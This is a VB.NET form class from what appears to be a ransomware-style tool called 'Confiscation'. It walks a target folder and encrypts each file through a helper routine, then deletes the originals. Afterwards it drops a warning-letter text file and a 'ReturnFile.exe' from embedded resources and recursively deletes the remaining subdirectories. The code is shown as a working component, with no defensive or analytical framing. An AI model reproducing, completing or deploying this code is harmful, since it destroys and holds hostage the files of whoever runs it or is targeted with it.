Imports System.IO
Imports System.Threading

Public Class ConfiscationWindow
    Dim cfFolder As String
    Dim queue As New Queue(Of Object())
    Dim cfd As Integer = 0
    Public Overloads Sub ShowDialog(cfFolder As String)
        Me.cfFolder = cfFolder
        MyBase.ShowDialog()
    End Sub
    Private Sub ConfiscationWindow_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        FileSearcher.RunWorkerAsync()
        FileConfiscater.RunWorkerAsync()
        FormUpdater.RunWorkerAsync()
    End Sub
    Private Sub FileSearcher_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles FileSearcher.DoWork
        Directory.CreateDirectory(Path.Combine(cfFolder, "Confiscation"))
        Confiscation.FileSearch(cfFolder, queue)
    End Sub
    Private Sub FileConfiscater_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles FileConfiscater.DoWork
        While True
            If queue.Count = 0 Then
                Thread.Sleep(10000)
            End If
            While queue.Count <> 0
                Dim f = queue.Dequeue
                Try
                    Dim fp = IIf(f(0).GetType = GetType(FileStream), CType(f(0), FileStream).Name, f(0))
                    If Confiscation.EncryptFile(CType(f(0), Stream), f(1)) Then
                        cfd += 1
                        File.Delete(fp)
                    Else
                        queue.Enqueue(f)
                    End If
                Catch ex As Exception
                    Console.WriteLine(ex.GetType.Name)
                    Console.WriteLine(ex.Message)
                    Console.WriteLine(ex.StackTrace)
                    queue.Enqueue(f)
                End Try
            End While
            If queue.Count = 0 Then
                Exit While
            End If
        End While
        File.WriteAllBytes(Path.Combine(cfFolder, "警告状.txt"), My.Resources.ConfiscationAttention)
        File.WriteAllBytes(Path.Combine(cfFolder, "ReturnFile.exe"), My.Resources.ReturnFile)
        For Each d In From i In Directory.GetDirectories(cfFolder) Where Path.GetFileNameWithoutExtension(i) <> "Confiscation"
            Directory.Delete(d, True)
        Next
    End Sub
    Private Sub FormUpdater_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles FormUpdater.DoWork
        While True
            Me.Invoke(Sub()
                          FoundFiles.Text = queue.Count
                          ConfiscatedFiles.Text = cfd
                      End Sub)
        End While
    End Sub
    Private Sub FileConfiscater_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles FileConfiscater.RunWorkerCompleted
        Me.Close()
    End Sub
End Class